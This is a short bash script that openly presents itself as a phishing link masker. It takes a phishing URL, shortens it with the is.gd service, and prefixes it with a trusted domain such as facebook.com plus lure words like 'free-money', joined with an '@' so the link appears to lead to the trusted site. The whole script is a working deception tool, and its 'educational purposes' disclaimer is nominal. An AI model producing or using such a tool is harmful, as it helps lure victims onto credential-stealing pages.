#Author:AnonymousX11-debug
#!bin/bash
clear
url_checker() {
 if [ ! "${1//:*}" = http ]; then
 if [ ! "${1//:*}" = https ]; then
 echo -e "\e[1;90m[!] Wrong url...Use either http or https. \e[0m"
 exit 1
fi
fi
}
   echo -e '\e[1;34m    __  ___           __            
  / / / / __ \/ /   /  |/  /___ ______/ /_____  _____
 / / / / /_/ / /   / /|_/ / __ `/ ___/ //_/ _ \/ ___/
/ /_/ / _, _/ /___/ /  / / /_/ (__  ) ,< /  __/ /    
\____/_/ |_/_____/_/  /_/\__,_/____/_/|_|\___/_/    
\e0m\n'                                                                                                                                                   
    printf "\e[1;37m ∆uthor: \e[0m \e[1;90m
A-N-O-N-Y-M-O-U-S-X-11-Debug\e[0m"

printf "\e[1;77m DISCLAIMER: \e[0m \e[1;36m
This Tool Should only be used For Educational Purposes...Take Care of The Tool By AnonMousX11-debug\em\n"
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
sleep 1
echo "Processing and Modifing the Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\e[1;34m I am Masking A Domain For You \e[0m"
echo -e "\e[1;94m Input A Domain To Mask The Phishing URL with either http or https Example:-https://Facebook.com or http://ngrok.com or https://instagram.com\e[0m"
echo -en "\e[32m ==> \e[0m"
read mask
url_checker $mask
echo -e '\nType Captivating words such as:(free-likes, free-money,free-pubguc)'
echo -e "\e[34m PLEASE DO NOT USE SPACE, ONLY USE '-' BETWEEN THE CAPTIVATING WORDS eg: free-likes, free-money\e[0m"
echo -en "\e[32m ==> \e[0m"
read words
echo -e "\nWait...as I Generate Your Masked Link... \n"  
sleep 1
final=$mask-$words@$shorter
echo -e "This is now your masked URL: \e[33m ${final} \e0m\n"